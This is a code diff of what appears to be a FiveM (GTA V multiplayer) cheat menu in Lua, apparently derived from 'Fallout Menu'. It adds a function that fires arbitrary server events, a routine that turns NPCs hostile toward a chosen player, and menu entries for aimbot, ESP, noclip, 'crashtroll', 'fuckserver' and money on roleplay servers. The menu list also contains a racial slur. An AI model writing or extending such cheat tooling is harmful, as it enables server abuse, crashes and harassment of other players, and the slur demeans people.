+            modEngine = GetVehicleMod(vehicle, 11),
+            modBrakes = GetVehicleMod(vehicle, 12),
+            modTransmission = GetVehicleMod(vehicle, 13),
+            modHorns = GetVehicleMod(vehicle, 14),
+            modSuspension = GetVehicleMod(vehicle, 15),
+            modArmor = GetVehicleMod(vehicle, 16),
+
+            modTurbo = IsToggleModOn(vehicle, 18),
+            modSmokeEnabled = IsToggleModOn(vehicle, 20),
+            modXenon = IsToggleModOn(vehicle, 22),
+
+            modFrontWheels = GetVehicleMod(vehicle, 23),
+            modBackWheels = GetVehicleMod(vehicle, 24),
+
+            modPlateHolder = GetVehicleMod(vehicle, 25),
+            modVanityPlate = GetVehicleMod(vehicle, 26),
+            modTrimA = GetVehicleMod(vehicle, 27),
+            modOrnaments = GetVehicleMod(vehicle, 28),
+            modDashboard = GetVehicleMod(vehicle, 29),
+            modDial = GetVehicleMod(vehicle, 30),
+            modDoorSpeaker = GetVehicleMod(vehicle, 31),
+            modSeats = GetVehicleMod(vehicle, 32),
+            modSteeringWheel = GetVehicleMod(vehicle, 33),
+            modShifterLeavers = GetVehicleMod(vehicle, 34),
+            modAPlate = GetVehicleMod(vehicle, 35),
+            modSpeakers = GetVehicleMod(vehicle, 36),
+            modTrunk = GetVehicleMod(vehicle, 37),
+            modHydrolic = GetVehicleMod(vehicle, 38),
+            modEngineBlock = GetVehicleMod(vehicle, 39),
+            modAirFilter = GetVehicleMod(vehicle, 40),
+            modStruts = GetVehicleMod(vehicle, 41),
+            modArchCover = GetVehicleMod(vehicle, 42),
+            modAerials = GetVehicleMod(vehicle, 43),
+            modTrimB = GetVehicleMod(vehicle, 44),
+            modTank = GetVehicleMod(vehicle, 45),
+            modWindows = GetVehicleMod(vehicle, 46),
+            modLivery = GetVehicleLivery(vehicle)
         }
     end
 
-    local polar, azimuth = 0, 90
+    FiveM.SetVehicleProperties = function(vehicle, props)
+        SetVehicleModKit(vehicle, 0)
 
-    function FM:SpectateTick()
-        if not FM:GetFunction("DoesCamExist")(self.SpectateCam) then
-            self.SpectateCam = FM:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
+        if props.plate ~= nil then SetVehicleNumberPlateText(vehicle, props.plate) end
+
+        if props.plateIndex ~= nil then SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex) end
+
+        if props.health ~= nil then SetEntityHealth(vehicle, props.health) end
+
+        if props.dirtLevel ~= nil then SetVehicleDirtLevel(vehicle, props.dirtLevel) end
+
+        if props.color1 ~= nil then
+            local color1, color2 = GetVehicleColours(vehicle)
+            SetVehicleColours(vehicle, props.color1, color2)
         end
 
-        while FM.Enabled do
-            Wait(0)
+        if props.color2 ~= nil then
+            local color1, color2 = GetVehicleColours(vehicle)
+            SetVehicleColours(vehicle, color1, props.color2)
+        end
 
-            if self.Spectating and not spec_on then
-                FM:GetFunction("SetCamActive")(self.SpectateCam, true)
-                FM:GetFunction("RenderScriptCams")(true, false, false, true, true)
-                spec_on = true
-                FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                walking = false
-            elseif not self.Spectating and spec_on then
-                FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), false)
-                FM:GetFunction("SetCamActive")(self.SpectateCam, false)
-                FM:GetFunction("RenderScriptCams")(false, false, false, false, false)
-                FM:GetFunction("SetFocusEntity")(FM:GetFunction("PlayerPedId")())
-                self.FreeCam:DisableMovement(false)
-                spec_on = false
+        if props.pearlescentColor ~= nil then
+            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
+            SetVehicleExtraColours(vehicle, props.pearlescentColor, wheelColor)
+        end
+
+        if props.wheelColor ~= nil then
+            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
+            SetVehicleExtraColours(vehicle, pearlescentColor, props.wheelColor)
+        end
+
+        if props.wheels ~= nil then SetVehicleWheelType(vehicle, props.wheels) end
+
+        if props.windowTint ~= nil then SetVehicleWindowTint(vehicle, props.windowTint) end
+
+        if props.neonEnabled ~= nil then
+            SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
+            SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
+            SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
+            SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
+        end
+
+        if props.extras ~= nil then
+            for id, enabled in pairs(props.extras) do
+                if enabled then
+                    SetVehicleExtra(vehicle, tonumber(id), 0)
+                else
+                    SetVehicleExtra(vehicle, tonumber(id), 1)
+                end
             end
+        end
 
-            if self.Spectating and spec_on then
-                if not self.SpectatingPlayer or not FM:GetFunction("DoesEntityExist")(FM:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
-                    self.Spectating = false
-                end
+        if props.neonColor ~= nil then SetVehicleNeonLightsColour(vehicle, props.neonColor[1], props.neonColor[2], props.neonColor[3]) end
 
-                local ent = FM:GetFunction("GetPlayerPed")(self.SpectatingPlayer)
+        if props.modSmokeEnabled ~= nil then ToggleVehicleMod(vehicle, 20, true) end
 
-                if FM:GetFunction("IsPedInAnyVehicle")(ent) then
-                    ent = FM:GetFunction("GetVehiclePedIsIn")(ent)
-                end
+        if props.tyreSmokeColor ~= nil then
+            SetVehicleTyreSmokeColor(vehicle, props.tyreSmokeColor[1], props.tyreSmokeColor[2], props.tyreSmokeColor[3])
+        end
 
-                local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
+        if props.modSpoilers ~= nil then SetVehicleMod(vehicle, 0, props.modSpoilers, false) end
 
-                if not self.Showing then
-                    local magX, magY = FM:GetFunction("GetDisabledControlNormal")(0, 1), FM:GetFunction("GetDisabledControlNormal")(0, 2)
-                    polar = polar + magX * 10
+        if props.modFrontBumper ~= nil then SetVehicleMod(vehicle, 1, props.modFrontBumper, false) end
 
-                    if polar >= 360 then
-                        polar = 0
-                    end
+        if props.modRearBumper ~= nil then SetVehicleMod(vehicle, 2, props.modRearBumper, false) end
 
-                    azimuth = azimuth + magY * 10
+        if props.modSideSkirt ~= nil then SetVehicleMod(vehicle, 3, props.modSideSkirt, false) end
 
-                    if azimuth >= 360 then
-                        azimuth = 0
-                    end
-                end
+        if props.modExhaust ~= nil then SetVehicleMod(vehicle, 4, props.modExhaust, false) end
 
-                local where = FM:Polar3DToWorld(coords, -3.5, polar, azimuth)
+        if props.modFrame ~= nil then SetVehicleMod(vehicle, 5, props.modFrame, false) end
 
-                if not FM:GetFunction("IsPedInAnyVehicle")(FM:GetFunction("PlayerPedId")()) then
-                    FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), true)
-                end
+        if props.modGrille ~= nil then SetVehicleMod(vehicle, 6, props.modGrille, false) end
 
-                self.FreeCam:DisableMovement(true)
-                FM:GetFunction("SetFocusPosAndVel")(where.x, where.y, where.z, 0, 0, 0)
-                FM:GetFunction("SetCamCoord")(self.SpectateCam, where.x, where.y, where.z)
-                FM:GetFunction("PointCamAtEntity")(self.SpectateCam, ent)
-            end
+        if props.modHood ~= nil then SetVehicleMod(vehicle, 7, props.modHood, false) end
+
+        if props.modFender ~= nil then SetVehicleMod(vehicle, 8, props.modFender, false) end
+
+        if props.modRightFender ~= nil then SetVehicleMod(vehicle, 9, props.modRightFender, false) end
+
+        if props.modRoof ~= nil then SetVehicleMod(vehicle, 10, props.modRoof, false) end
+
+        if props.modEngine ~= nil then SetVehicleMod(vehicle, 11, props.modEngine, false) end
+
+        if props.modBrakes ~= nil then SetVehicleMod(vehicle, 12, props.modBrakes, false) end
+
+        if props.modTransmission ~= nil then SetVehicleMod(vehicle, 13, props.modTransmission, false) end
+
+        if props.modHorns ~= nil then SetVehicleMod(vehicle, 14, props.modHorns, false) end
+
+        if props.modSuspension ~= nil then SetVehicleMod(vehicle, 15, props.modSuspension, false) end
+
+        if props.modArmor ~= nil then SetVehicleMod(vehicle, 16, props.modArmor, false) end
+
+        if props.modTurbo ~= nil then ToggleVehicleMod(vehicle, 18, props.modTurbo) end
+
+        if props.modXenon ~= nil then ToggleVehicleMod(vehicle, 22, props.modXenon) end
+
+        if props.modFrontWheels ~= nil then SetVehicleMod(vehicle, 23, props.modFrontWheels, false) end
+
+        if props.modBackWheels ~= nil then SetVehicleMod(vehicle, 24, props.modBackWheels, false) end
+        
+        if props.modPlateHolder ~= nil then SetVehicleMod(vehicle, 25, props.modPlateHolder, false) end
+
+        if props.modVanityPlate ~= nil then SetVehicleMod(vehicle, 26, props.modVanityPlate, false) end
+
+        if props.modTrimA ~= nil then SetVehicleMod(vehicle, 27, props.modTrimA, false) end
+
+        if props.modOrnaments ~= nil then SetVehicleMod(vehicle, 28, props.modOrnaments, false) end
+
+        if props.modDashboard ~= nil then SetVehicleMod(vehicle, 29, props.modDashboard, false) end
+
+        if props.modDial ~= nil then SetVehicleMod(vehicle, 30, props.modDial, false) end
+
+        if props.modDoorSpeaker ~= nil then SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false) end
+
+        if props.modSeats ~= nil then SetVehicleMod(vehicle, 32, props.modSeats, false) end
+
+        if props.modSteeringWheel ~= nil then SetVehicleMod(vehicle, 33, props.modSteeringWheel, false) end
+
+        if props.modShifterLeavers ~= nil then SetVehicleMod(vehicle, 34, props.modShifterLeavers, false) end
+
+        if props.modAPlate ~= nil then SetVehicleMod(vehicle, 35, props.modAPlate, false) end
+
+        if props.modSpeakers ~= nil then SetVehicleMod(vehicle, 36, props.modSpeakers, false) end
+
+        if props.modTrunk ~= nil then SetVehicleMod(vehicle, 37, props.modTrunk, false) end
+
+        if props.modHydrolic ~= nil then SetVehicleMod(vehicle, 38, props.modHydrolic, false) end
+
+        if props.modEngineBlock ~= nil then SetVehicleMod(vehicle, 39, props.modEngineBlock, false) end
+
+        if props.modAirFilter ~= nil then SetVehicleMod(vehicle, 40, props.modAirFilter, false) end
+
+        if props.modStruts ~= nil then SetVehicleMod(vehicle, 41, props.modStruts, false) end
+
+        if props.modArchCover ~= nil then SetVehicleMod(vehicle, 42, props.modArchCover, false) end
+
+        if props.modAerials ~= nil then SetVehicleMod(vehicle, 43, props.modAerials, false) end
+
+        if props.modTrimB ~= nil then SetVehicleMod(vehicle, 44, props.modTrimB, false) end
+
+        if props.modTank ~= nil then SetVehicleMod(vehicle, 45, props.modTank, false) end
+
+        if props.modWindows ~= nil then SetVehicleMod(vehicle, 46, props.modWindows, false) end
+
+        if props.modLivery ~= nil then
+            SetVehicleMod(vehicle, 48, props.modLivery, false)
+            SetVehicleLivery(vehicle, props.modLivery)
         end
     end
 
-    function FM:ScreenText(text, font, centered, x, y, scale, r, g, b, a)
-        FM:GetFunction("SetTextFont")(font)
-        FM:GetFunction("SetTextProportional")()
-        FM:GetFunction("SetTextScale")(scale, scale)
-        FM:GetFunction("SetTextColour")(r, g, b, a)
-        FM:GetFunction("SetTextDropShadow")(0, 0, 0, 0, 255)
-        FM:GetFunction("SetTextEdge")(1, 0, 0, 0, 255)
-        FM:GetFunction("SetTextDropShadow")()
-        FM:GetFunction("SetTextOutline")()
-        FM:GetFunction("SetTextCentre")(centered)
-        FM:GetFunction("BeginTextCommandDisplayText")("STRING")
-        FM:GetFunction("AddTextComponentSubstringPlayerName")(text)
-        FM:GetFunction("EndTextCommandDisplayText")(x, y)
+    FiveM.DeleteVehicle = function(vehicle)
+        SetEntityAsMissionEntity(Object, 1, 1)
+        DeleteEntity(Object)
+        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
+        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
     end
 
-    function FM:NotificationAlpha(fade_out)
-        last_alpha = FM:GetFunction("GetGameTimer")() + dict.math.huge
-        if doing_alpha and not fade_out then return end
-        doing_alpha = true
+    FiveM.DirtyVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 15.0) end
 
-        CreateThread(function()
-            while notif_alpha < 200 and not fade_out do
-                Wait(0)
-                notif_alpha = notif_alpha + 10
-                if notif_alpha >= 200 then break end
+    FiveM.CleanVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 1.0) end
+
+    FiveM.GetPlayers = function()
+        local players    = {}
+        for i=0, 255, 1 do
+            local ped = GetPlayerPed(i)
+            if DoesEntityExist(ped) then
+                table.insert(players, i)
             end
+        end
+        return players
+    end
 
-            while not fade_out and last_alpha > FM:GetFunction("GetGameTimer")() do
-                Wait(0)
+    FiveM.GetClosestPlayer = function(coords)
+        local players         = FiveM.GetPlayers()
+        local closestDistance = -1
+        local closestPlayer   = -1
+        local usePlayerPed    = false
+        local playerPed       = PlayerPedId()
+        local playerId        = PlayerId()
+
+        if coords == nil then
+            usePlayerPed = true
+            coords       = GetEntityCoords(playerPed)
+        end
+
+        for i=1, #players, 1 do
+            local target = GetPlayerPed(players[i])
+
+            if not usePlayerPed or (usePlayerPed and players[i] ~= playerId) then
+                local targetCoords = GetEntityCoords(target)
+                local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)
+
+                if closestDistance == -1 or closestDistance > distance then
+                    closestPlayer   = players[i]
+                    closestDistance = distance
+                end
             end
+        end
 
-            while notif_alpha > 0 or fade_out do
-                notif_alpha = notif_alpha - 8
-                Wait(0)
-                if notif_alpha <= 0 then break end
+        return closestPlayer, closestDistance
+    end
+
+    FiveM.GetWaypoint = function()
+        local g_Waypoint = nil;
+        if DoesBlipExist(GetFirstBlipInfoId(8)) then
+            local blipIterator = GetBlipInfoIdIterator(8)
+            local blip = GetFirstBlipInfoId(8, blipIterator)
+            g_Waypoint = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector());
+        end
+        print(g_Waypoint);
+        return g_Waypoint;
+    end
+
+    FiveM.GetSafePlayerName = function(name)
+        if string.IsNullOrEmpty(name) then return "" end;
+        return name:gsub("%^", "\\^"):gsub("%~", "\\~"):gsub("%<", "«"):gsub("%>", "-->");
+    end
+
+    FiveM.SetResourceLocked = function(resource, item)
+        Citizen.CreateThread(function()
+            if item ~= nil then local item_type, item_subtype = item(); end
+
+            if GetResourceState(resource) == "started" then
+                if item ~= nil then item:Enabled(true); end;
+                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.None); end;
+            else
+                if item ~= nil then item:Enabled(false); end;
+                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.Lock); end;
             end
-
-            doing_alpha = false
         end)
     end
 
-    local type_colors = {
-        ["INFO"] = {
-            text = "[~b~INFO~w~]"
-        },
-        ["WARN"] = {
-            text = "[~o~WARN~w~]"
-        },
-        ["ERROR"] = {
-            text = "[~r~ERROR~w~]"
-        },
-        ["SUCCESS"] = {
-            text = "[~g~SUCCESS~w~]"
-        }
-    }
-
-    function FM:TrimString(str, only_whitespace)
-        local char = "%s"
-        if #str >= 70 and not only_whitespace then return str:sub(1, 67) .. "..." end
-
-        return dict.string.match(str, "^" .. char .. "*(.-)" .. char .. "*$") or str
-    end
-
-    function FM:TrimStringBasedOnWidth(str, font, size, max_width)
-        local real_width = self.Painter:GetTextWidth(str, font, size)
-        if real_width <= max_width then return str end
-        local out_str = str
-        local cur = #str
-
-        while real_width > max_width and out_str ~= "" do
-            if not str:sub(cur, cur) then break end
-            out_str = out_str:sub(1, cur - 1)
-            real_width = self.Painter:GetTextWidth(out_str, font, size)
-            cur = cur - 1
-        end
-
-        return out_str:sub(1, #out_str - 3) .. "..."
-    end
-
-    function FM:DrawNotifications()
-        notifications_h = 64
-        local max_notifs_on_screen = 20
-        local cur_on_screen = 0
-        if not self.Config.ShowText then return end
-
-        if not cur_notifs then
-            cur_notifs = #self.Notifications
-            self:NotificationAlpha()
-        end
-
-        if cur_notifs ~= #self.Notifications then
-            cur_notifs = #self.Notifications
-            self:NotificationAlpha()
-        end
-
-        if self.Showing then
-            notif_alpha = 200
-        elseif not self.Showing and cur_notifs <= 0 and notif_alpha == 200 then
-            self:NotificationAlpha(true)
-        end
-
-        if cur_notifs <= 0 and last_alpha - self:GetFunction("GetGameTimer")() >= dict.math.huge then
-            last_alpha = self:GetFunction("GetGameTimer")() + 2000
-        end
-
-        if notif_alpha <= 0 then return end
-
-        local n_x, n_y, n_w = self.Config.NotifX, self.Config.NotifY, self.Config.NotifW
-
-        if not n_x or not n_y or not n_w then return end
-        self.Painter:DrawText("~w~[~y~Fallout Menu~w~] Notifications", 4, false, n_x, n_y, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))
-
-        if #self.Notifications <= 0 then
-            self.Painter:DrawText("~w~No new notifications to display.", 4, false, n_x + 0.5, n_y + 33, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))
+    FiveM.TriggerCustomEvent = function(server, event, ...)
+        local payload = msgpack.pack({...})
+        if server then
+            TriggerServerEventInternal(event, payload, payload:len())
         else
-            local notifY = n_y + 33
-            local s_y = notifY
-            local id = 1
-
-            for k, v in dict.pairs(self.Notifications) do
-                if cur_on_screen < max_notifs_on_screen then
-                    local left = v.Expires - self:GetFunction("GetGameTimer")()
-                    local str = (type_colors[v.Type] or {}).text
-
-                    if str == nil then
-                        str = "BAD TYPE - " .. v.Type
-                        v.Message = ""
-                    end
-
-                    local n_alpha = notif_alpha + 50
-
-                    if left <= 0 then
-                        table.remove(self.Notifications, k)
-                    else
-                        local w_ = self.Painter:GetTextWidth(str, 4, 0.35)
-                        n_alpha = dict.math.ceil(n_alpha * (left / 1000) / v.Duration)
-                        self.Painter:DrawText(str, 4, false, n_x, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
-                        self.Painter:DrawText(self:TrimStringBasedOnWidth(v.Message, 4, 0.35, n_w - w_ + 8), 4, false, n_x + w_ - 3, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
-                        notifY = notifY + 22
-                        id = id + 1
-                        cur_on_screen = cur_on_screen + 1
-                    end
-                end
-            end
-
-            local e_y = notifY
-            local diff = e_y - s_y
-
-            notifications_h = notifications_h + (diff - 24)
+            TriggerEventInternal(event, payload, payload:len())
         end
-
-        self.Painter:DrawRect(n_x, n_y, 420, notifications_h, 0, 0, 0, notif_alpha)
-        self.Painter:DrawRect(n_x, n_y + 29, 420, 2, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], notif_alpha + 55)
     end
+end
 
-    local text_alpha = 255
+local function RequestNetworkControl(Request)
+    local hasControl = false
+    while hasControl == false do
+        hasControl = NetworkRequestControlOfEntity(Request)
+        if hasControl == true or hasControl == 1 then
+            break
+        end
+        if
+            NetworkHasControlOfEntity(ped) == true and hasControl == true or
+                NetworkHasControlOfEntity(ped) == true and hasControl == 1
+         then
+            return true
+        else
+            return false
+        end
+    end
+end
 
-    CreateThread(function()
-        local branding = {
-            name = "[~y~" .. FM.Name .. "~w~]",
-            resource = "Resource: ~y~" .. FM:GetFunction("GetCurrentResourceName")(),
-            ip = "IP: ~y~" .. FM:GetFunction("GetCurrentServerEndpoint")(),
-            id = "ID: ~y~" .. FM:GetFunction("GetPlayerServerId")(FM:GetFunction("PlayerId")()),
-            veh = "Vehicle: ~y~%s",
-            build = (_Executor_Strings[_Executor] or "") .. " ~w~Build (" .. FM.Version .. ")"
-        }
+local function makePedHostile(target, ped, swat, clone)
+    if swat == 1 or swat == true then
+        RequestNetworkControl(ped)
+        TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+        SetPedCanSwitchWeapon(ped, true)
+    else
+        if clone == 1 or clone == true then
+            local Hash = GetEntityModel(ped)
+            if DoesEntityExist(ped) then
+                DeletePed(ped)
+                RequestModel(Hash)
+                local coords = GetEntityCoords(GetPlayerPed(target), true)
+                if HasModelLoaded(Hash) then
+                    local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
+                    if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
+                        SetModelAsNoLongerNeeded(Hash)
+                        RequestNetworkControl(newPed)
+                        TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
+                        SetPedCanSwitchWeapon(ped, true)
+                    end
+                end
+            end
+        else
+            local TargetHandle = GetPlayerPed(target)
+            RequestNetworkControl(ped)
+            TaskCombatPed(ped, TargetHandle, 0, 16)
+        end
+    end
+end
 
-        while FM.Enabled do
+local ojtgh = "50.0"
+
+menulist = {
+        
+       
+        'StupidNiggaPaster',
+        'player',
+        'self',
+        'weapon',
+        'vehicle',
+        'world',
+        'misc',
+        'teleport',
+        'lua',
+        'settingslol',
+        
+        
+        'allplayer',
+        'playeroptions',
+		'troll',
+		"crashtroll",
+		
+        
+      
+        'appearance',
+        'modifyskintextures',
+          'modifyhead',
+        'modifiers',
+		'skinsmodels',
+		
+        'weaponspawnerplayer',
+        'weaponspawner',
+		'WeaponCustomization',
+		
+        
+       
+        'melee',
+        'pistol',
+        'shotgun',
+        'smg',
+        'assault',
+        'sniper',
+        'thrown',
+        'heavy',
+        
+      
+        'vehiclespawner',
+        'vehiclemods',
+        'vehiclemenu',
+		"VehBoostMenu",
+        
+        'vehiclecolors',
+        'vehiclecolors_primary',
+        'vehiclecolors_secondary',
+        'primary_classic',
+        'primary_matte',
+        'primary_metal',
+        'secondary_classic',
+        'secondary_matte',
+        'secondary_metal',
+        
+        'vehicletuning',
+        
+       
+        'compacts',
+        'sedans',
+        'suvs',
+        'coupes',
+        'muscle',
+        'sportsclassics',
+        'sports',
+        'super',
+        'WWBA',
+        'offroad',
+        'industrial',
+        'utility',
+        'vans',
+        'cycles',
+        'boats',
+        'helicopters',
+        'planes',
+        'service',
+        'commercial',
+        
+        
+        'fuckserver',
+        'objectspawner',
+        'objectlist',
+        'weather',
+        'time',
+        
+        'credits',
+		'esp',
+		'webradio',
+        
+      
+        'saveload',
+        'pois',
+        
+      
+        'esx',
+        'vrp',
+        'other',
+		'money',
+		'player1',
+		'drogas',
+		'mecanico',
+
+}
+
+
+
+faceItemsList = {}
+faceTexturesList = {}
+hairItemsList = {}
+hairTextureList = {}
+maskItemsList = {}
+hatItemsList = {}
+hatTexturesList = {}
+
+
+NoclipSpeedOps = {1, 5, 10, 20, 30}
+
+NoclipSpeed = 1
+oldSpeed = nil
+
+
+ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
+
+ForcefieldRadius = 5.0
+
+
+FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
+FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}
+
+FastRunMultiplier = 1.0
+FastSwimMultiplier = 1.0
+
+
+RotationOps = {0, 45, 90, 135, 180}
+
+ObjRotation = 90
+
+
+GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
+GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}
+
+GravAmount = 9.8
+
+
+SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
+SpeedModAmt = 1.0
+
+
+ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0,10000.0}
+EspDistance = 500.0
+
+
+ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
+ESPRefreshTime = 0
+
+
+AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
+AimbotBone = "SKEL_HEAD"
+
+
+ClothingSlots = {1, 2, 3, 4, 5}
+
+
+PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}
+
+PedAttackType = 1
+
+
+RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
+RadiosListWords = {
+    "Los Santos Rock Radio",
+    "Non-Stop-Pop FM",
+    "Radio Los Santos",
+    "Channel X",
+    "West Coast Talk Radio",
+    "Rebel Radio",
+    "Soulwax FM",
+    "East Los FM",
+    "West Coast Classics",
+    "Blue Ark",
+    "Worldwide FM",
+    "FlyLo FM",
+    "The Lowdown 91.1",
+    "The Lab",
+    "Radio Mirror Park",
+    "Space 103.2",
+    "Vinewood Boulevard Radio",
+    "Blonded Los Santos 97.8 FM",
+    "Blaine County Radio",
+	
+}
+
+
+WeathersList = { 
+    "CLEAR",
+    "EXTRASUNNY",
+    "CLOUDS",
+    "OVERCAST",
+    "RAIN",
+    "CLEARING",
+    "THUNDER",
+    "SMOG",
+    "FOGGY",
+    "XMAS",
+    "SNOWLIGHT",
+    "BLIZZARD"
+}
+
+objs_tospawn = {
+    "stt_prop_stunt_track_start",
+    "prop_container_01a",
+    "prop_contnr_pile_01a",
+    "ce_xr_ctr2",
+    "stt_prop_ramp_jump_xxl",
+    "hei_prop_carrier_jet",
+    "prop_parking_hut_2",
+    "csx_seabed_rock3_",
+    "db_apart_03_",
+    "db_apart_09_",
+    "stt_prop_stunt_tube_l",
+    "stt_prop_stunt_track_dwuturn",
+    "xs_prop_hamburgher_wl",
+    "sr_prop_spec_tube_xxs_01a",
+	"prop_air_bigradar",
+	"p_tram_crash_s",
+	"prop_windmill_01",
+	"prop_start_gate_01",
+	"prop_trailer_01_new",
+	"sr_prop_sr_track_block_01",
+	"sr_prop_spec_tube_xxs_04a",
+	"stt_prop_stunt_soccer_sball",
+	"stt_prop_stunt_track_cutout",
+	"stt_prop_stunt_target_small",
+	"prop_cj_big_boat",
+}
+
+
+local allweapons = {
+    "WEAPON_UNARMED",
+    "WEAPON_KNIFE",
+    "WEAPON_KNUCKLE",
+    "WEAPON_NIGHTSTICK",
+    "WEAPON_HAMMER",
+    "WEAPON_BAT",
+    "WEAPON_GOLFCLUB",
+    "WEAPON_CROWBAR",
+    "WEAPON_BOTTLE",
+    "WEAPON_DAGGER",
+    "WEAPON_HATCHET",
+    "WEAPON_MACHETE",
+    "WEAPON_FLASHLIGHT",
+    "WEAPON_SWITCHBLADE",
+    "WEAPON_POOLCUE",
+    "WEAPON_PIPEWRENCH",
+    
+
+    "WEAPON_GRENADE",
+    "WEAPON_STICKYBOMB",
+    "WEAPON_PROXMINE",
+    "WEAPON_BZGAS",
+    "WEAPON_SMOKEGRENADE",
+    "WEAPON_MOLOTOV",
+    "WEAPON_FIREEXTINGUISHER",
+    "WEAPON_PETROLCAN",
+    "WEAPON_SNOWBALL",
+    "WEAPON_FLARE",
+    "WEAPON_BALL",
+    
+
+    "WEAPON_PISTOL",
+    "WEAPON_PISTOL_MK2",
+    "WEAPON_COMBATPISTOL",
+    "WEAPON_APPISTOL",
+    "WEAPON_REVOLVER",
+    "WEAPON_REVOLVER_MK2",
+    "WEAPON_DOUBLEACTION",
+    "WEAPON_PISTOL50",
+    "WEAPON_SNSPISTOL",
+    "WEAPON_SNSPISTOL_MK2",
+    "WEAPON_HEAVYPISTOL",
+    "WEAPON_VINTAGEPISTOL",
+    "WEAPON_STUNGUN",
+    "WEAPON_FLAREGUN",
+    "WEAPON_MARKSMANPISTOL",
+    "WEAPON_RAYPISTOL",
+    
+
+    "WEAPON_MICROSMG",
+    "WEAPON_MINISMG",
+    "WEAPON_SMG",
+    "WEAPON_SMG_MK2",
+    "WEAPON_ASSAULTSMG",
+    "WEAPON_COMBATPDW",
+    "WEAPON_GUSENBERG",
+    "WEAPON_MACHINEPISTOL",
+    "WEAPON_MG",
+    "WEAPON_COMBATMG",
+    "WEAPON_COMBATMG_MK2",
+    "WEAPON_RAYCARBINE",
+    
+
+    "WEAPON_ASSAULTRIFLE",
+    "WEAPON_ASSAULTRIFLE_MK2",
+    "WEAPON_CARBINERIFLE",
+    "WEAPON_CARBINERIFLE_MK2",
+    "WEAPON_ADVANCEDRIFLE",
+    "WEAPON_SPECIALCARBINE",
+    "WEAPON_SPECIALCARBINE_MK2",
+    "WEAPON_BULLPUPRIFLE",
+    "WEAPON_BULLPUPRIFLE_MK2",
+    "WEAPON_COMPACTRIFLE",
+    
+
+    "WEAPON_PUMPSHOTGUN",
+    "WEAPON_PUMPSHOTGUN_MK2",
+    "WEAPON_SWEEPERSHOTGUN",
+    "WEAPON_SAWNOFFSHOTGUN",
+    "WEAPON_BULLPUPSHOTGUN",
+    "WEAPON_ASSAULTSHOTGUN",
+    "WEAPON_MUSKET",
+    "WEAPON_HEAVYSHOTGUN",
+    "WEAPON_DBSHOTGUN",
+    
+
+    "WEAPON_SNIPERRIFLE",
+    "WEAPON_HEAVYSNIPER",
+    "WEAPON_HEAVYSNIPER_MK2",
+    "WEAPON_MARKSMANRIFLE",
+    "WEAPON_MARKSMANRIFLE_MK2",
+    
+
+    "WEAPON_GRENADELAUNCHER",
+    "WEAPON_GRENADELAUNCHER_SMOKE",
+    "WEAPON_RPG",
+    "WEAPON_MINIGUN",
+    "WEAPON_FIREWORK",
+    "WEAPON_RAILGUN",
+    "WEAPON_HOMINGLAUNCHER",
+    "WEAPON_COMPACTLAUNCHER",
+    "WEAPON_RAYMINIGUN",
+}
+
+local meleeweapons = {
+    {"WEAPON_KNIFE", "Knife"},
+    {"WEAPON_KNUCKLE", "Brass Knuckles"},
+    {"WEAPON_NIGHTSTICK", "Nightstick"},
+    {"WEAPON_HAMMER", "Hammer"},
+    {"WEAPON_BAT", "Baseball Bat"},
+    {"WEAPON_GOLFCLUB", "Golf Club"},
+    {"WEAPON_CROWBAR", "Crowbar"},
+    {"WEAPON_BOTTLE", "Bottle"},
+    {"WEAPON_DAGGER", "Dagger"},
+    {"WEAPON_HATCHET", "Hatchet"},
+    {"WEAPON_MACHETE", "Machete"},
+    {"WEAPON_FLASHLIGHT", "Flashlight"},
+    {"WEAPON_SWITCHBLADE", "Switchblade"},
